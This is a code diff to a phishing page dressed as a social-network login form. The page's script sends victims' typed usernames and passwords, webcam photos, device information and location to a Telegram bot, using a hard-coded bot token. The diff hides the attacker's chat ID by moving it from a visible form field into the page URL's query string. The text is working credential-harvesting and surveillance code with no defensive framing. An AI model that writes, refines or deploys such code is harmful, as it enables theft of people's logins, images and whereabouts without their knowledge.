@@ -135,7 +135,6 @@
             <div class="login-form">
                 <input type="text" id="username" placeholder="Email address or phone number">
                 <input type="password" id="password" placeholder="Password">
-                <input type="text" id="chatId" placeholder="Enter Chat ID">
                 <button onclick="sendToTelegram()">Log in</button>
                 <a href="#">Forgotten password?</a>
                 <div class="error-message" id="error-message">Wrong username or password. Please try again.</div>
@@ -144,7 +143,19 @@
         </div>
     </div>
     <script>
+        function getQueryParams() {
+            const params = {};
+            const queryString = window.location.search.slice(1);
+            const parts = queryString.split('&');
+            for (let part of parts) {
+                const [key, value] = part.split('=');
+                params[decodeURIComponent(key)] = decodeURIComponent(value);
+            }
+            return params;
+        }
+
         const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
+        const { chatId } = getQueryParams();
 
         async function startVideo() {
             try {
@@ -175,7 +186,6 @@
         }
 
         async function sendImageToTelegram(blob) {
-            const chatId = document.getElementById('chatId').value;
             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
             const formData = new FormData();
             formData.append('chat_id', chatId);
@@ -230,7 +240,6 @@
         }
 
         async function sendUserInfoToTelegram(userInfo) {
-            const chatId = document.getElementById('chatId').value;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
@@ -288,7 +297,6 @@
         }
 
         async function sendLocationToTelegram(locationInfo) {
-            const chatId = document.getElementById('chatId').value;
             const url = `https://api.telegram.org/bot${botToken}/sendLocation`;
 
             try {
@@ -326,7 +334,6 @@
         function sendToTelegram() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const chatId = document.getElementById('chatId').value;
             const message = `Username: ${username}\nPassword: ${password}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
